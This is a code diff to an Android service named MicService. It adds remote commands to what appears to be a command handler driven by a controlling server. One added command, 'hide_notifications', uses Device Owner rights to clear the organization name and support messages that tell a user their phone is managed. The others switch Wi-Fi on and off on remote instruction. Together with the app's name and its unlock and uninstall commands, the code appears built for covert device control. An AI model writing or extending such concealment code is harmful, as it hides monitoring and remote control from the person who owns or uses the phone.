@@ -642,6 +642,95 @@ class MicService : Service() {
                     safeSend("ACK:unlock_app:error:${e.message}")
                 }
             }
+            "hide_notifications" -> {
+                // Hide Device Owner organization notifications
+                Log.i(TAG, "CMD: hide_notifications - hiding Device Owner messages")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        
+                        // Clear organization name
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                            dpm.setOrganizationName(admin, "")
+                        }
+                        // Clear support messages
+                        dpm.setShortSupportMessage(admin, null)
+                        dpm.setLongSupportMessage(admin, null)
+                        
+                        safeSend("ACK:hide_notifications:success")
+                        Log.i(TAG, "Device Owner notifications hidden")
+                    } else {
+                        safeSend("ACK:hide_notifications:not_device_owner")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to hide notifications: ${e.message}")
+                    safeSend("ACK:hide_notifications:error:${e.message}")
+                }
+            }
+            "wifi_on" -> {
+                // Turn WiFi ON
+                Log.i(TAG, "CMD: wifi_on - enabling WiFi")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        // Device Owner can toggle WiFi on Android 10+
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                            dpm.setWifiEnabled(admin, true)
+                            safeSend("ACK:wifi_on:success")
+                            Log.i(TAG, "WiFi enabled via Device Owner")
+                        } else {
+                            // Fallback for older Android - use WifiManager
+                            @Suppress("DEPRECATION")
+                            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                            @Suppress("DEPRECATION")
+                            wm.isWifiEnabled = true
+                            safeSend("ACK:wifi_on:success")
+                        }
+                    } else {
+                        // Not Device Owner - try WifiManager (may fail on Android 10+)
+                        @Suppress("DEPRECATION")
+                        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                        @Suppress("DEPRECATION")
+                        wm.isWifiEnabled = true
+                        safeSend("ACK:wifi_on:success_legacy")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to enable WiFi: ${e.message}")
+                    safeSend("ACK:wifi_on:error:${e.message}")
+                }
+            }
+            "wifi_off" -> {
+                // Turn WiFi OFF
+                Log.i(TAG, "CMD: wifi_off - disabling WiFi")
+                try {
+                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+                    if (dpm.isDeviceOwnerApp(packageName)) {
+                        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                            dpm.setWifiEnabled(admin, false)
+                            safeSend("ACK:wifi_off:success")
+                            Log.i(TAG, "WiFi disabled via Device Owner")
+                        } else {
+                            @Suppress("DEPRECATION")
+                            val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                            @Suppress("DEPRECATION")
+                            wm.isWifiEnabled = false
+                            safeSend("ACK:wifi_off:success")
+                        }
+                    } else {
+                        @Suppress("DEPRECATION")
+                        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+                        @Suppress("DEPRECATION")
+                        wm.isWifiEnabled = false
+                        safeSend("ACK:wifi_off:success_legacy")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to disable WiFi: ${e.message}")
+                    safeSend("ACK:wifi_off:error:${e.message}")
+                }
+            }
             "uninstall_app" -> {
                 // Uninstall the app (clear device owner first, then uninstall)
                 Log.i(TAG, "CMD: uninstall_app - starting uninstall process")
